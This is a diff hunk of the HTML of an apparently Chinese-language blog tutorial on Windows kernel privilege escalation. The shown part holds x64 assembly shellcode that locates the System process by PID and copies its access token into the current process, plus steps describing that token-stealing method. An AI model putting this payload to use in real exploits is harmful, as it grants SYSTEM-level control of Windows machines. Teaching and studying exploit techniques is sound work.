@@ -40,13 +40,8 @@
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">shellCode proc</span><br><span class="line">; shellcode编写</span><br><span class="line">mov rax, gs:[188h]    ;Kprcb.Kpthread</span><br><span class="line">mov rax, [rax+220h]    ;process</span><br><span class="line">mov    rcx, rax    ; keep copy value</span><br><span class="line">mov    rdx, 4        ; system PID</span><br><span class="line"> </span><br><span class="line">findSystemPid:</span><br><span class="line">    mov    rax, [rax+2e8h]    ; ActiveProcessLinks : _LIST_ENTRY</span><br><span class="line">    sub    rax, 2e8h</span><br><span class="line">    cmp    [rax+2e0h], rdx</span><br><span class="line">    jnz findSystemPid</span><br><span class="line"> </span><br><span class="line">    ; 替换Token</span><br><span class="line">    mov rdx, [rax+348h]    ; get system token</span><br><span class="line">    mov [rcx+348h], rdx    ; copy</span><br><span class="line">    ret</span><br><span class="line"> </span><br><span class="line">shellCode endp</span><br></pre></td></tr></table></figure>
 
 <p>在windows内核中主要提权手段如下：</p>
-<p>[+] ShellCode目的: 进行提权</p>
-<p>[+] 提权手段: 将system进程的Token赋值给cmd</p>
-<p>[+] 提权的汇编步骤:</p>
-<pre><code>==&gt; 找到system的Token, 记作TokenSys
-==&gt; 找到cmd的Token. 记作TokenCmd
-==&gt; 实现TokenCmd = TokenSys
-</code></pre>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[+] ShellCode目的: 进行提权</span><br><span class="line">[+] 提权手段: 将system进程的Token赋值给cmd</span><br><span class="line">[+] 提权的汇编步骤:</span><br><span class="line">==&gt; 找到system的Token, 记作TokenSys</span><br><span class="line">==&gt; 找到cmd的Token. 记作TokenCmd</span><br><span class="line">==&gt; 实现TokenCmd = TokenSys</span><br></pre></td></tr></table></figure>
+
 <hr>
 <p>结束、学废了么！！！</p>
 <hr>
